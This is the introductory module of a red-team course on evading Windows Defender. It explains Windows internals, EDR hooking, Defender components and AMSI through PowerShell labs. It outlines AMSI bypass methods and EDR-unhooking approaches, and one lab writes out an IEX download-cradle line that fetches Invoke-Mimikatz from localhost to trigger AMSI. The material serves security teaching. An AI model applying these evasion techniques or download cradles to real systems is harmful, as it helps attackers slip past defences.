# Module 00 - Introduction to the Antivirus Landscape (2026)

---

## Who Is This Course For?

You failed a red teaming interview. That is OK.
This course will fix that.

Red teaming means you get paid to break into systems.
Companies hire you to find their weak points before real attackers do.
You write a report showing what you found and how to fix it.

To do this, you need to get past antivirus and security tools.
This course teaches you how.

You need to know one thing: how to use Windows (open files, download things, use the terminal).
Everything else, this course will teach you from scratch.

Always get written permission before testing any system.
This is for learning and authorized testing only.

---

## What You Will Learn in This Module

Before we talk about bypassing anything, you need to understand
how Windows works at a low level.

You cannot bypass something you do not understand.

This module covers:

```
PART 1:  What happens when you run a program on Windows
PART 2:  What is a process and what is memory
PART 3:  What are DLLs and how programs talk to Windows
PART 4:  The API chain - how your code reaches the kernel
PART 5:  What Windows Defender is and how it works (internals)
PART 6:  What AMSI is - full breakdown with hands-on labs
PART 7:  What ETW is - full breakdown with hands-on labs
PART 8:  How attackers get caught - detection types explained
PART 9:  The cat and mouse game - how to think and adapt
PART 10: Lab setup (VMware Pro + Windows 11 from scratch)
PART 11: Open source tools for this course
PART 12: Your first hands-on labs
```

---

## PART 1: WHAT HAPPENS WHEN YOU RUN A PROGRAM

---

### 1.1 - You Double-Click an EXE. Now What?

You download a file called `tool.exe` and double-click it.
What happens next? Most people have no idea.

Here is what actually happens, step by step:

```
Step 1: Windows reads the file from disk into memory (RAM)

Step 2: Windows checks the file format
        Every EXE and DLL on Windows uses a format called PE
        (Portable Executable). Windows reads the PE header to
        understand how to load the program.

Step 3: Windows creates a new PROCESS for this program
        A process is a container. It holds the running program.
        It gets its own private memory space.
        No other program can see or touch this memory (normally).

Step 4: Windows loads required DLLs into the process memory
        Your program uses functions from Windows.
        These functions live in DLL files.
        Windows loads these DLLs into your process memory.

Step 5: Windows creates a THREAD to start running the code
        A thread is the thing that actually runs code.
        Think of the process as the container, and the thread
        as the worker inside it.

Step 6: The program runs.
        The thread starts reading instructions from memory
        and running them one by one.
```

Every single thing in this list matters for red teaming.
Let me explain each one in detail.

---

### 1.2 - What is a PE (Portable Executable) File?

Every .exe and .dll file on Windows follows the PE format.

When Defender scans a file, it reads the PE structure.
When you inject code into a process, you deal with PE structures.
When you create a custom payload, you create a PE file.

A PE file has sections:

```
+------------------------+
|   DOS Header           |  <-- Old compatibility header
+------------------------+
|   PE Signature         |  <-- Marks this as a PE file
+------------------------+
|   File Header          |  <-- Machine type, number of sections
+------------------------+
|   Optional Header      |  <-- Entry point, image base, size
+------------------------+
|   Section Headers      |  <-- Describes each section below
+------------------------+
|   .text section        |  <-- The actual code (instructions)
+------------------------+
|   .data section        |  <-- Global variables with values
+------------------------+
|   .rdata section       |  <-- Read-only data, import tables
+------------------------+
|   .rsrc section        |  <-- Resources (icons, strings)
+------------------------+
|   .reloc section       |  <-- Relocation info
+------------------------+
```

The most important parts for now:

```
.text   = Where the code lives (the instructions the CPU runs)
.data   = Where variables are stored
.rdata  = Where import tables are (which DLLs and functions the program needs)
```

You can look at any PE file right now on your computer.

Hands-on: Open PowerShell and run this:

```powershell
# Look at the PE sections of notepad.exe
# First, let's see where notepad lives
Get-Command notepad.exe | Select-Object Source

# Now let's look at its sections using a simple .NET method
$path = "C:\Windows\System32\notepad.exe"
$bytes = [System.IO.File]::ReadAllBytes($path)

# The PE signature is at the offset stored at position 0x3C
$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
Write-Host "PE Header starts at offset: 0x$($peOffset.ToString('X'))"

# Read the PE signature (should be "PE\0\0" = 0x50450000)
$peSignature = [BitConverter]::ToInt32($bytes, $peOffset)
Write-Host "PE Signature: 0x$($peSignature.ToString('X'))"

if ($peSignature -eq 0x00004550) {
    Write-Host "This is a valid PE file!"
} else {
    Write-Host "Not a PE file."
}
```

Why does this matter?
When Defender scans a file, it reads this PE structure.
It checks the sections, the imports, the entry point.
If something looks wrong or suspicious in the PE structure,
Defender gets more suspicious about the file.

---

## PART 2: WHAT IS A PROCESS AND WHAT IS MEMORY

---

### 2.1 - What is a Process?

A process is a running program.

When you open Notepad, Windows creates a process for it.
When you open Chrome, Windows creates a process for it.
When you open PowerShell, Windows creates a process for it.

Each process gets:

```
1. Its own PRIVATE MEMORY SPACE
   - No other process can read or write this memory (normally)
   - This is called the Virtual Address Space (VAS)

2. A PROCESS ID (PID)
   - A unique number that identifies this process
   - You see these in Task Manager

3. One or more THREADS
   - Threads are the workers that run code
   - A process starts with one thread
   - It can create more threads later

4. A TOKEN
   - This says what permissions the process has
   - "Am I running as admin or as a normal user?"

5. Internal data structures
   - PEB (Process Environment Block) - info about the process
   - A list of loaded DLLs
   - Environment variables
   - Command-line arguments
```

Hands-on: See processes right now:

```powershell
# List all running processes
Get-Process | Format-Table Id, ProcessName, Path -AutoSize

# Find a specific process
Get-Process -Name notepad

# Get detailed info about a process
Get-Process -Name powershell | Select-Object *

# See the process ID of the current PowerShell
Write-Host "My PID is: $PID"
```

Open Task Manager (Ctrl + Shift + Esc) and click "Details" tab.
You will see every process with its PID.
Every one of these is a potential target for injection.


### 2.2 - Virtual Address Space (Process Memory)

Each process thinks it has a huge amount of memory all to itself.
On a 64-bit system, each process has 128 TB of virtual address space.

But it does not actually use all of that.
Windows maps virtual addresses to real physical RAM as needed.

The important thing: each process has its OWN virtual address space.
Process A's memory at address 0x00007FF6 is DIFFERENT from
Process B's memory at the same address.

They are completely separate. This is what keeps processes safe.

When we do process injection later in this course, we are
BREAKING this separation on purpose. We are writing our code
into another process's memory and making it run there.


### 2.3 - How Process Memory is Organized

When a process runs, its memory is organized like this:

```
HIGH ADDRESSES (top)
+------------------------------------------+
|                                          |
|   KERNEL MEMORY (off limits)             |
|   You cannot access this from user mode  |
|                                          |
+------------------------------------------+  <-- 0x7FFFFFFFFFFF (boundary)
|                                          |
|   STACK                                  |
|   Local variables, function return       |
|   addresses. Grows downward.             |
|                                          |
+------------------------------------------+
|                                          |
|   (free space)                           |
|                                          |
+------------------------------------------+
|                                          |
|   HEAP                                   |
|   Memory you allocate at runtime.        |
|   malloc(), new, VirtualAlloc().         |
|   Grows upward.                          |
|                                          |
+------------------------------------------+
|                                          |
|   DLLs                                   |
|   Loaded libraries: ntdll.dll,           |
|   kernel32.dll, amsi.dll, etc.           |
|                                          |
+------------------------------------------+
|                                          |
|   .data, .rdata, .bss                    |
|   Global variables and read-only data    |
|                                          |
+------------------------------------------+
|                                          |
|   .text                                  |
|   The program's executable code          |
|                                          |
+------------------------------------------+
|                                          |
|   PE Headers                             |
|   The EXE header loaded in memory        |
|                                          |
+------------------------------------------+
LOW ADDRESSES (bottom)
```

Two important areas for red teaming:

```
STACK: When a function is called, its arguments and local variables
       go on the stack. When the function returns, they are removed.
       Stack overflow attacks target this area.

HEAP:  When a program needs memory during runtime, it asks for it.
       VirtualAlloc(), malloc(), new - all give you heap memory.
       When we inject shellcode, we often put it on the heap.
```


### 2.4 - Memory Permissions (Very Important)

Every block of memory has PERMISSIONS. This controls what
you can do with that memory.

```
Permission    What It Means
-----------------------------------------------------
READ (R)      You can read the data at this address
WRITE (W)     You can change the data at this address
EXECUTE (X)   The CPU can run this memory as code

Common combinations:
R--   Read only (data, strings)
RW-   Read + Write (variables, heap)
R-X   Read + Execute (code sections)
RWX   Read + Write + Execute (suspicious!)
```

Why RWX is suspicious:

Normal programs do not need memory that is writable AND executable.
Code sections are R-X (you can run them but not change them).
Data sections are RW- (you can change them but not run them).

When a program creates RWX memory, it usually means:
"I want to write code into memory and then run it."

This is exactly what shellcode injection does.
Defender watches for RWX memory allocations.

Hands-on: Check memory permissions of a process:

```powershell
# You can use Process Explorer (from Sysinternals) to see memory
# Download from: https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer

# Or use PowerShell to check basic info:
$proc = Get-Process -Name notepad
Write-Host "Notepad Process ID: $($proc.Id)"
Write-Host "Working Set (RAM used): $([math]::Round($proc.WorkingSet64 / 1MB, 2)) MB"
Write-Host "Virtual Memory: $([math]::Round($proc.VirtualMemorySize64 / 1MB, 2)) MB"
Write-Host "Private Memory: $([math]::Round($proc.PrivateMemorySize64 / 1MB, 2)) MB"
```

For a better view, download Process Hacker or Process Explorer.
Open any process and look at "Memory" tab.
You will see every memory region, its address, size, and protection.

```
Example of what you will see in Process Explorer Memory tab:

Address         Size      Protection    Details
0x7FF6B8A00000  4 KB      R--           PE Header
0x7FF6B8A01000  64 KB     R-X           .text (code)
0x7FF6B8A11000  8 KB      R--           .rdata
0x7FF6B8A13000  4 KB      RW-           .data
0x00000235F000  256 KB    RW-           Heap
0x00007FFD0000  1.8 MB    R-X           ntdll.dll code
```


### 2.5 - The PEB (Process Environment Block)

Every process has a PEB. It is a structure in memory that
holds important info about the process.

The PEB contains:

```
- ImageBaseAddress     Where the EXE is loaded in memory
- ProcessParameters    Command line, current directory, environment
- Ldr                  The LOADER DATA - list of all loaded DLLs
- BeingDebugged        Is a debugger attached? (1 = yes, 0 = no)
- OSMajorVersion       Windows version info
```

The PEB.Ldr (Loader Data) is very important.
It has a linked list of every DLL loaded in the process.

Why does this matter?
- Malware reads the PEB to find loaded DLLs
- Direct syscall tools read PEB.Ldr to find ntdll.dll in memory
- Anti-debug checks look at PEB.BeingDebugged
- Process hollowing reads PEB.ImageBaseAddress

Hands-on: Read the PEB of the current process:

```powershell
# In PowerShell, you can check some PEB-related info:

# Is a debugger attached?
$isDebuggerPresent = [System.Diagnostics.Debugger]::IsAttached
Write-Host "Debugger attached: $isDebuggerPresent"

# What DLLs are loaded in the current PowerShell process?
$proc = Get-Process -Id $PID
$proc.Modules | Format-Table ModuleName, FileName, BaseAddress -AutoSize

# Look at this list carefully!
# You will see:
# - powershell.exe (the main program)
# - ntdll.dll (the native API - gateway to kernel)
# - kernel32.dll (high-level Windows API)
# - kernelbase.dll (implementation of kernel32 functions)
# - amsi.dll (AMSI - we will learn about this soon!)
# - clr.dll or coreclr.dll (.NET runtime)
# - and many more
```

Find `amsi.dll` in that list. Note its BaseAddress.
That address is where AMSI lives in this PowerShell process.
When we learn to bypass AMSI, we will patch code at that address.

---

## PART 3: WHAT ARE DLLs AND HOW PROGRAMS TALK TO WINDOWS

---

### 3.1 - What is a DLL?

DLL stands for Dynamic Link Library.

A DLL is a file that contains code and data that
multiple programs can use at the same time.

Example: Every program that needs to create a file calls
the `CreateFileW` function. This function lives in `kernel32.dll`.
Instead of every program having its own copy of this function,
they all share the one copy in `kernel32.dll`.

```
Without DLLs:
notepad.exe has its own CreateFile code
chrome.exe has its own CreateFile code
word.exe has its own CreateFile code
(Waste of memory - same code copied three times)

With DLLs:
kernel32.dll has the CreateFile code
notepad.exe, chrome.exe, and word.exe all use it
(One copy shared by everyone)
```

DLLs are loaded into the process memory space.
When notepad.exe starts, Windows loads kernel32.dll into
notepad's memory. The kernel32.dll code is now part of
notepad's address space.


### 3.2 - Important Windows DLLs

You will see these DLLs again and again in this course.
Learn them now.

```
DLL Name         What It Does                           Why It Matters
------------------------------------------------------------------------------------
ntdll.dll        Native API. The bridge between         This is where syscalls happen.
                 user mode and kernel mode.              EDRs hook functions here.
                 Every process loads this first.         Direct syscalls bypass these hooks.

kernel32.dll     Win32 API. High-level Windows           Most programs call functions here.
                 functions like CreateFile,              This is the "official" way to
                 CreateProcess, VirtualAlloc.            talk to Windows.

kernelbase.dll   The actual code behind kernel32.        kernel32 forwards to kernelbase.
                 Many functions moved here.

advapi32.dll     Security and registry functions.        OpenProcessToken, RegSetValue,
                 Service management.                     privilege escalation uses these.

user32.dll       GUI functions. Windows, messages,       SetWindowsHookEx injection uses this.
                 keyboard/mouse input.

amsi.dll         Anti-Malware Scan Interface.            Loaded into PowerShell and .NET
                 Scans scripts before they run.          processes. This is what we bypass.

mscoree.dll      .NET runtime loader.                    Loaded when .NET code runs.
clr.dll          .NET Common Language Runtime.            Where .NET assemblies execute.
```


### 3.3 - How a Program Calls a Windows Function

Let's say your program wants to create a new file.

Here is what happens step by step:

```
Your Program
    |
    | calls CreateFileW("test.txt", ...)
    v
kernel32.dll
    |
    | CreateFileW is just a wrapper
    | It calls NtCreateFile in ntdll.dll
    v
ntdll.dll
    |
    | NtCreateFile prepares the syscall number
    | Puts arguments in the right CPU registers
    | Runs the 'syscall' CPU instruction
    v
--- USER MODE / KERNEL MODE BOUNDARY ---
    |
    v
Windows Kernel (ntoskrnl.exe)
    |
    | The kernel receives the syscall
    | It actually creates the file on disk
    | Returns the result
    v
--- Back to USER MODE ---
    |
    v
Your Program gets the file handle
```

This chain is CRITICAL to understand because:

```
1. EDR products hook ntdll.dll functions
   They replace the beginning of NtCreateFile with a jump
   to their own code. This lets them see every call your
   program makes before it reaches the kernel.

2. Direct syscalls SKIP ntdll.dll
   If you put the syscall instruction in your own code,
   you bypass the EDR hooks entirely. The EDR never sees
   your call.

3. AMSI is a DLL hook too
   PowerShell loads amsi.dll and calls AmsiScanBuffer
   before running your script. If you break AmsiScanBuffer,
   the scan never happens.
```

Hands-on: See this chain in action:

```powershell
# Let's trace what DLLs are loaded when a simple command runs
# First, let's see all DLLs in this PowerShell process

$proc = Get-Process -Id $PID
Write-Host "DLLs loaded in this PowerShell process:"
Write-Host "========================================="
$proc.Modules | Sort-Object ModuleName | ForEach-Object {
    Write-Host "$($_.ModuleName) -> $($_.FileName)"
}

Write-Host ""
Write-Host "Total DLLs loaded: $($proc.Modules.Count)"
```

You will see 50-100+ DLLs loaded in a single PowerShell process.
Every one of these is code sitting in memory that could be
patched, hooked, or changed.

---

## PART 4: THE API CHAIN - HOW YOUR CODE REACHES THE KERNEL

---

### 4.1 - User Mode vs Kernel Mode

Windows has two privilege levels:

```
KERNEL MODE (Ring 0)
- Full access to everything
- Can read/write any memory
- Can talk to hardware directly
- Where the OS kernel lives
- Where drivers run
- Where the real work happens

USER MODE (Ring 3)
- Limited access
- Cannot touch hardware directly
- Cannot access other processes' memory (normally)
- Where your programs run
- Where DLLs like ntdll.dll and kernel32.dll live
```

Programs in user mode CANNOT do anything important by themselves.
They cannot create files, start processes, or allocate memory.
They must ASK the kernel to do it for them.

The way they ask is through SYSTEM CALLS (syscalls).


### 4.2 - What is a System Call (Syscall)?

A syscall is a way for user-mode code to ask the kernel
to do something.

Each syscall has a NUMBER. This number tells the kernel
which function to run.

```
Example syscall numbers (these change with every Windows version):

Syscall Number    Kernel Function             What It Does
-----------------------------------------------------------------------
0x0055            NtCreateFile                Create or open a file
0x0026            NtOpenProcess               Open a handle to a process
0x0018            NtAllocateVirtualMemory     Allocate memory in a process
0x003A            NtWriteVirtualMemory        Write to a process's memory
0x00C1            NtCreateThreadEx            Create a new thread
0x0050            NtProtectVirtualMemory      Change memory permissions
```

The normal flow (through ntdll.dll):

```
ntdll!NtAllocateVirtualMemory:
    mov r10, rcx              ; save first argument
    mov eax, 0x0018           ; put syscall number in eax
    syscall                   ; transition to kernel mode
    ret                       ; return to caller
```

That is all ntdll does for most Nt functions.
It puts the syscall number in the EAX register and runs `syscall`.

This is why direct syscalls are possible.
If you know the syscall number, you can put it in EAX yourself
and run the `syscall` instruction from your own code.
You do not need ntdll.dll at all.


### 4.3 - Why EDRs Hook ntdll.dll

EDR (Endpoint Detection and Response) products need to see
what programs are doing.

The easiest place to watch is ntdll.dll.
Every program that wants to do something important goes
through ntdll.dll. If you control ntdll.dll, you see everything.

How EDR hooking works:

```
BEFORE HOOKING (clean ntdll.dll):

ntdll!NtAllocateVirtualMemory:
    4C 8B D1              mov r10, rcx
    B8 18 00 00 00        mov eax, 0x18
    0F 05                 syscall
    C3                    ret

AFTER HOOKING (EDR modified the first bytes):

ntdll!NtAllocateVirtualMemory:
    E9 xx xx xx xx        jmp EDR_Hook_Function    <-- EDR replaced the code!
    B8 18 00 00 00        mov eax, 0x18
    0F 05                 syscall
    C3                    ret

Now when ANY program calls NtAllocateVirtualMemory:
1. It jumps to the EDR's code first
2. The EDR logs: "Process X is allocating memory"
3. The EDR checks: "Is this suspicious?"
4. If OK, the EDR calls the real syscall
5. If bad, the EDR blocks it
```

This is why process injection gets caught.
The EDR sees you calling NtAllocateVirtualMemory in another
process, followed by NtWriteVirtualMemory, followed by
NtCreateThreadEx. That pattern = injection. Blocked.


### 4.4 - The Full API Chain (Summary)

Here is the complete picture. Memorize this:

```
YOUR CODE
    |
    | You call CreateProcess, VirtualAlloc, etc.
    v
kernel32.dll / kernelbase.dll   (Win32 API - high level)
    |
    | These functions are wrappers
    | They prepare arguments and call ntdll
    v
ntdll.dll   (Native API - low level)     <--- EDR hooks are HERE
    |
    | Puts syscall number in EAX
    | Runs 'syscall' instruction
    v
====== USER MODE / KERNEL MODE BOUNDARY ======
    |
    v
ntoskrnl.exe   (Windows Kernel)
    |
    | Does the actual work
    | Creates file / allocates memory / etc.
    |
    v
RESULT returned to your code
```

As a red teamer, you attack this chain at different points:

```
Attack Point 1: Skip kernel32.dll, call ntdll directly
   - Slightly less monitored
   - Some old EDRs only hook kernel32

Attack Point 2: Skip ntdll.dll, use direct syscalls
   - Bypasses all user-mode EDR hooks
   - Your code talks to the kernel directly
   - This is what SysWhispers tools do

Attack Point 3: Unhook ntdll.dll
   - Load a clean copy of ntdll.dll from disk
   - Overwrite the hooked version in memory
   - Now all EDR hooks are removed

Each of these is covered in Module 06.
```

---

## PART 5: WHAT IS WINDOWS DEFENDER AND HOW IT WORKS (INTERNALS)

---

### 5.1 - Defender is Not Just "an Antivirus"

Windows Defender in 2026 has many parts.
It is a full security system, not just a file scanner.

Here are Defender's main parts:

```
COMPONENT                  FILE                    WHERE IT RUNS
-------------------------------------------------------------------------
Antimalware Service        MsMpEng.exe             User mode (service)
Scan Engine                MpEngine.dll            User mode (loaded by MsMpEng)
Filter Driver              WdFilter.sys            Kernel mode (file system)
Network Filter             WdNisDrv.sys            Kernel mode (network)
Boot Driver                WdBoot.sys              Kernel mode (boot time)
AMSI Provider              MpOav.dll               User mode (loaded per-process)
Platform Update            MpSigStub.exe           User mode (updates)
```

Each part has a specific job:


### 5.2 - WdFilter.sys (The Kernel Gatekeeper)

This is a kernel-mode file system filter driver.

It sits between programs and the file system.
Every time ANY program tries to read, write, create, or
open a file, WdFilter sees it.

```
Normal file access:

Your Program                The file system works normally.
    |
    v
File System (NTFS)
    |
    v
Disk

With WdFilter:

Your Program
    |
    v
WdFilter.sys               WdFilter INTERCEPTS the file access.
    |                       It checks: "Should I scan this file?"
    |                       If yes, it sends it to MsMpEng for scanning.
    |                       If the file is clean, it lets it through.
    |                       If the file is bad, it blocks the access.
    v
File System (NTFS)
    |
    v
Disk
```

This is why Defender catches malware the moment you download it.
WdFilter sees the file being written to disk and triggers a scan.

This is also why "fileless" attacks exist.
If you never write a file to disk, WdFilter has nothing to scan.


### 5.3 - MsMpEng.exe and MpEngine.dll (The Brain)

MsMpEng.exe is the Windows Defender service process.
It runs all the time in the background.

Inside MsMpEng.exe, the scan engine MpEngine.dll does the real work.

MpEngine.dll can:

```
1. SIGNATURE SCAN
   Compare files against a database of known malware patterns.
   The database is updated daily (sometimes multiple times per day).

2. HEURISTIC SCAN
   Look at the structure and behavior of a file.
   "This PE file has no imports but has executable code
    and a small .text section that decodes data at runtime.
    This LOOKS like a payload dropper."

3. EMULATION
   MpEngine has a built-in CPU emulator.
   It can RUN your file inside a virtual environment.
   It watches what the file tries to do.
   "This file unpacks itself, then calls VirtualAlloc,
    then writes to another process. This is malware."

4. MACHINE LEARNING
   The cloud sends metadata about unknown files to Microsoft.
   Microsoft runs ML models that classify files as good or bad.
   This decision is sent back in seconds.
```


### 5.4 - The Full Defender Scan Flow

Here is what happens when you download a file:

```
Step 1: You click "Download" in the browser
Step 2: Browser writes bytes to disk
Step 3: WdFilter.sys intercepts the disk write
Step 4: WdFilter sends the file info to MsMpEng.exe
Step 5: MpEngine.dll reads the file and starts analysis:
        a) Check file hash against signature database
        b) Parse PE structure for suspicious patterns
        c) If unknown, run in the emulator
        d) If still unknown, send hash to Microsoft cloud
        e) Cloud runs ML models and returns a verdict
Step 6: MpEngine returns verdict to WdFilter
Step 7: If CLEAN: File is written to disk. You can open it.
        If BAD: File is deleted or quarantined. You get a warning.
```


### 5.5 - Behavior Monitoring (The Hardest to Beat)

Defender does not just scan files.
It watches what RUNNING programs do.

This is handled by a combination of:
- ETW events (we cover this in Part 7)
- WdFilter kernel callbacks
- API monitoring through AMSI

What Defender watches at runtime:

```
BEHAVIOR                              DEFENDER REACTION
-----------------------------------------------------------------------
Process opens lsass.exe memory        HIGH ALERT - credential theft
Process creates RWX memory            SUSPICIOUS - possible shellcode
Process writes to another process     ALERT - possible injection
Process creates thread in another     ALERT - possible injection
PowerShell downloads and executes     ALERT - possible dropper
CMD spawns from Office application    ALERT - possible macro attack
New service installed by unknown      SUSPICIOUS - possible persistence
Registry Run key modified             WATCHED - possible persistence
```

This is why a clean file can still get caught.
Your file passes the scan. It runs. But then it does
something suspicious, and Defender's behavior monitor catches it.


### 5.6 - Tamper Protection and PPL

Defender protects itself using two things:

```
1. TAMPER PROTECTION
   - Prevents anyone from turning off Defender
   - Even administrators cannot disable it through scripts
   - Registry changes to Defender settings are blocked
   - Defender service cannot be stopped

2. PPL (Protected Process Light)
   - MsMpEng.exe runs as a Protected Process
   - Protected processes cannot be opened by normal processes
   - Even admin processes cannot read/write Defender's memory
   - You need kernel-level access to touch a PPL process
```

This is why you cannot just "turn off" Defender.
You need to bypass it, not disable it.

Hands-on: Check Defender protection level:

```powershell
# Check if Defender is running as PPL
Get-Process -Name MsMpEng | Select-Object Id, ProcessName

# Try to open Defender's process (this will give limited access)
$proc = Get-Process -Name MsMpEng
try {
    $handle = $proc.Handle
    Write-Host "Got handle: $handle"
} catch {
    Write-Host "Cannot get full handle - PPL is protecting it"
    Write-Host "Error: $($_.Exception.Message)"
}
```


### 5.7 - Attack Surface Reduction (ASR) Rules

ASR rules block specific attack patterns before they happen.

```powershell
# Check which ASR rules are active
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids

# Common ASR Rules (GUIDs):
# d4f940ab-401b-4efc-aadc-ad5f3c50688a  Block Office child processes
# 3b576869-a4ec-4529-8536-b80a7769e899  Block Office from creating executables
# 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84  Block Office from injecting into processes
# 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b  Block Win32 API calls from macros
# 5beb7efe-fd9a-4556-801d-275e5ffc04cc  Block execution of obfuscated scripts
# d3e037e1-3eb8-44c8-a917-57927947596d  Block JavaScript/VBScript from launching downloads
# be9ba2d9-53ea-4cdc-84e5-9b1eeee46550  Block executable content from email
# 26190899-1602-49e8-8b27-eb1d0a1ce869  Block Office from creating child processes
```

ASR rules can break your attack chain even if you bypass AMSI and EDR.
You need to know which rules are active on the target.


### 5.8 - Smart App Control

New in Windows 11. Uses AI and cloud to decide if an app is trusted.

```
How it works:
1. You run an unknown EXE
2. Smart App Control checks:
   - Is this file signed by a trusted publisher?
   - Has Microsoft seen this file before?
   - Does the cloud ML model trust this file?
3. If the answer is NO to all: the file is BLOCKED

This means:
- Your custom-compiled tools will be blocked
- Even if they have no malware signatures
- Just being "unknown" is enough to get blocked
```

Smart App Control can be in three states:
```
Evaluation Mode  - Watching but not blocking (learning)
On               - Actively blocking unknown apps
Off              - Disabled (cannot be turned back on without reset)
```

Check it:
```
Settings -> Privacy & security -> Windows Security -> App & browser control
```

---

## PART 6: WHAT IS AMSI - FULL BREAKDOWN WITH HANDS-ON

---

### 6.1 - What AMSI Is (Technical Definition)

AMSI stands for Anti-Malware Scan Interface.

It is a Windows feature that lets programs ASK the antivirus
to scan a piece of content before running it.

The programs that use AMSI:
```
PowerShell      - Scans every command and script before running
.NET (C#)       - Scans assemblies loaded with Assembly.Load()
VBScript        - Scans VBS scripts
JavaScript      - Scans JS through Windows Script Host
Office VBA      - Scans macros before running
WMI             - Scans WMI script operations
```

AMSI is a DLL called `amsi.dll`.
When PowerShell starts, it loads amsi.dll into its process memory.
Then it calls functions in amsi.dll before running any code.


### 6.2 - AMSI Step by Step (What Actually Happens)

Let's trace exactly what happens when you type a command
in PowerShell.

```
YOU TYPE: Get-Process

Step 1: PowerShell receives the text "Get-Process"

Step 2: PowerShell calls AmsiScanBuffer()
        This function is inside amsi.dll
        PowerShell passes:
        - The text "Get-Process" (as a byte buffer)
        - The length of the text
        - A content name (like "PowerShell_script_123")
        - An AMSI session handle
        - A pointer to receive the result

Step 3: AmsiScanBuffer() inside amsi.dll:
        - Takes the buffer
        - Sends it to the registered antimalware provider
        - In most cases, this is Windows Defender (MpOav.dll)

Step 4: Defender checks the buffer content:
        - Compares against known malware signatures
        - Checks for known bad strings
        - Returns a result code

Step 5: The result comes back to AmsiScanBuffer():
        - AMSI_RESULT_CLEAN (0)        = safe
        - AMSI_RESULT_NOT_DETECTED (1) = not sure, probably safe
        - AMSI_RESULT_DETECTED (32768) = malware found!

Step 6: PowerShell checks the result:
        - If clean: runs "Get-Process" normally
        - If detected: BLOCKS the command and shows an error
```


### 6.3 - The AMSI Functions (amsi.dll Exports)

amsi.dll has these functions that matter:

```
AmsiInitialize(appName, amsiContext)
    Called ONCE when the program starts.
    Creates an AMSI context.
    Returns a handle that is used for all future scans.

AmsiOpenSession(amsiContext, session)
    Opens a scan session.
    A session groups related scans together.

AmsiScanBuffer(amsiContext, buffer, length, contentName, session, result)
    THE MAIN FUNCTION.
    This is where the scan happens.
    Takes a buffer of bytes and returns clean/detected.

AmsiScanString(amsiContext, string, contentName, session, result)
    Same as AmsiScanBuffer but takes a string instead of bytes.
    Internally calls AmsiScanBuffer.

AmsiCloseSession(amsiContext, session)
    Closes the scan session.

AmsiUninitialize(amsiContext)
    Shuts down AMSI for this process.
```

The key target for bypass is AmsiScanBuffer.
If you break this function, AMSI cannot scan anything.


### 6.4 - Hands-On: See AMSI in Action

Let's actually SEE AMSI working. Open PowerShell on your Windows 11 VM.

Lab 1: Trigger an AMSI detection

```powershell
# Type this in PowerShell:
"Invoke-Mimikatz"

# OUTPUT: Invoke-Mimikatz
# This is fine - it is just a string, not a command.
# AMSI does not care about plain strings that are not executed.

# Now try to actually use it as a command:
Invoke-Mimikatz

# OUTPUT: The term 'Invoke-Mimikatz' is not recognized...
# This is NOT an AMSI block - PowerShell just does not have this command.
# AMSI did scan it, but the error is because the function does not exist.
```

Lab 2: Trigger a REAL AMSI block

```powershell
# This string is known to AMSI and will be blocked when executed:
# We will use IEX (Invoke-Expression) to try to run a known bad string

$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-Mimikatz.ps1')"
Invoke-Expression $cmd

# You will see something like:
# "This script contains malicious content and has been blocked
#  by your antivirus software."
#
# This is AMSI blocking the content.
# Even though the URL is fake and nothing was downloaded,
# AMSI saw the string pattern and blocked it.
```

Lab 3: See which strings AMSI flags

```powershell
# Try different strings to see what AMSI catches:

# This will be caught:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# This will be caught:
"amsiInitFailed"

# This will be caught:
"Invoke-Expression (New-Object Net.WebClient).DownloadString"

# But these are fine:
"hello world"
"Get-Process"
"Invoke-Command"
```

Notice: AMSI blocks specific PATTERNS, not just commands.
Even typing certain strings in certain contexts triggers AMSI.
The string "AmsiUtils" by itself in reflection calls is flagged.


### 6.5 - Hands-On: See amsi.dll Loaded in PowerShell

```powershell
# See all modules loaded in this PowerShell process
$modules = (Get-Process -Id $PID).Modules

# Find amsi.dll
$amsi = $modules | Where-Object { $_.ModuleName -eq "amsi.dll" }

if ($amsi) {
    Write-Host "amsi.dll is LOADED in this process"
    Write-Host "File: $($amsi.FileName)"
    Write-Host "Base Address: 0x$($amsi.BaseAddress.ToString('X'))"
    Write-Host "Size: $($amsi.ModuleMemorySize) bytes"
    Write-Host ""
    Write-Host "This means AMSI is active and scanning your commands."
} else {
    Write-Host "amsi.dll is NOT loaded - AMSI might be disabled"
}
```

The BaseAddress is where amsi.dll lives in memory.
The function AmsiScanBuffer is somewhere inside that memory range.
When we patch AMSI, we will write new bytes at a specific
offset from this base address.


### 6.6 - How AMSI Bypass Works (The Idea)

There are several ways to break AMSI:

```
METHOD 1: Memory Patching
   Find AmsiScanBuffer in memory.
   Change the first bytes of the function.
   Make it return "CLEAN" immediately without scanning.

   Before patch:
   AmsiScanBuffer:
       test rdi, rdi       ; check if context is valid
       je error             ; jump if not
       ... (actual scanning code)

   After patch:
   AmsiScanBuffer:
       xor eax, eax        ; set return value to 0 (AMSI_RESULT_CLEAN)
       ret                  ; return immediately
       ... (rest of code is never reached)

METHOD 2: Reflection (amsiInitFailed)
   PowerShell has an internal class called AmsiUtils.
   It has a field called amsiInitFailed.
   If this field is TRUE, PowerShell skips AMSI entirely.
   Using .NET reflection, you can set this field to TRUE.

METHOD 3: Hardware Breakpoints
   Set a hardware breakpoint on AmsiScanBuffer.
   When the function is called, the breakpoint fires.
   In the breakpoint handler, change the return value.
   No code is modified in memory (harder to detect).

METHOD 4: Context Corruption
   Corrupt the AMSI context so it cannot work.
   AMSI fails silently, and scripts run without scanning.
```

We will do ALL of these hands-on in Module 01.
For now, just understand the concept.


### 6.7 - Why AMSI Bypass is the First Step

In almost every red team attack that uses PowerShell or .NET,
AMSI bypass is the FIRST thing you do.

```
WITHOUT AMSI bypass:
1. You type your attack command
2. AMSI scans it
3. AMSI finds a known pattern
4. Command is blocked
5. Attack fails

WITH AMSI bypass:
1. You run AMSI bypass code (a few lines)
2. AMSI is broken
3. You type your attack command
4. AMSI tries to scan but returns "clean" (because it is broken)
5. Command runs
6. Attack succeeds
```

---

## PART 7: WHAT IS ETW - FULL BREAKDOWN WITH HANDS-ON

---

### 7.1 - What ETW Is (Technical Definition)

ETW stands for Event Tracing for Windows.

It is a logging system built into the Windows kernel.
Programs, drivers, and Windows itself can send events to ETW.
